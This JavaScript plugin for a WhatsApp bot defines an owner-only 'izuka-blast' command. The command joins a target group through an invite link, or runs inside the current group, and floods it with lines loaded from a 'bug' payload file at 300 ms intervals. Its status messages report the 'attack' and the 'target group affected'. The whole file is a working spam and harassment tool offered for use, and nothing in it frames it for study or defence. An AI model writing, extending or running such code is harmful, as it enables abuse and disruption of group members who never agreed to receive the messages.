const bugchat = require('../../bug/izuka4.js');
const config = require('../../config');
const { cmd } = require('../command');

cmd({
  pattern: 'izuka-blast',
  desc: 'Envoie un spam intensif dans un groupe',
  category: 'bug',
  filename: __filename
}, async (m, Matrix) => {
  const prefix = config.PREFIX;
  const cmdName = m.body.startsWith(prefix)
    ? m.body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
    : '';

  if (cmdName !== 'izuka-blast') return;

  const botNumber = await Matrix.decodeJid(Matrix.user.id);
  const senderId = m.sender;
  const isSudo = [
    botNumber,
    config.OWNER_NUMBER + '@s.whatsapp.net',
    ...(config.SUDO || []).map(n => n + '@s.whatsapp.net'),
  ].includes(senderId);

  if (!isSudo) {
    return await Matrix.sendMessage(m.from, {
      text: '*📛 THIS IS AN OWNER COMMAND*',
    }, { quoted: m });
  }

  const args = m.body.trim().split(' ').slice(1);
  const isGroupLink = args[0]?.startsWith('https://chat.whatsapp.com/');
  const attackLines = bugchat.split('\n').filter(Boolean);

  // 🧨 Si se lyen group sou DM
  if (!m.isGroup && isGroupLink) {
    const inviteCode = args[0].split('/')[3];
    try {
      const groupId = await Matrix.groupAcceptInvite(inviteCode);
      await Matrix.sendMessage(senderId, {
        text: `✅ Joined group via invite.\n🚀 Attacking ${groupId}...`,
      }, { quoted: m });

      for (let line of attackLines) {
        await Matrix.sendMessage(groupId, {
          text: `💥 ${line}\n_IZUKA-MD STRIKE_`,
        });
        await new Promise(r => setTimeout(r, 300));
      }

      await Matrix.sendMessage(senderId, {
        text: `✅ *IZUKA-BLAST* completed on group.`,
      }, { quoted: m });

    } catch (e) {
      return await Matrix.sendMessage(senderId, {
        text: "❌ Failed to join group. Link invalid or restricted.",
      }, { quoted: m });
    }

    return;
  }

  // 🚨 Si li lanse dirèkteman nan group
  if (m.isGroup) {
    await Matrix.sendMessage(m.from, {
      text: `🚨 *IZUKA-BLAST LAUNCHED*\n🧨 Target: ${m.from}\n💬 Messages: ${attackLines.length}`,
    }, { quoted: m });

    for (let line of attackLines) {
      await Matrix.sendMessage(m.from, {
        text: `⚠️ ${line}\n_BY DAWENS BOY 🦋_`,
      });
      await new Promise(r => setTimeout(r, 300));
    }

    await Matrix.sendMessage(m.from, {
      text: `✅ *IZUKA-BLAST COMPLETE*\n🔥 Target group affected.`,
    }, { quoted: m });

    return;
  }

  // 🛑 Ni group ni lyen pa bay
  await Matrix.sendMessage(m.from, {
    text: `❌ Usage:\n.izuka-blast https://chat.whatsapp.com/xxxxx (from DM)\n.izuka-blast (from group)`,
  }, { quoted: m });
});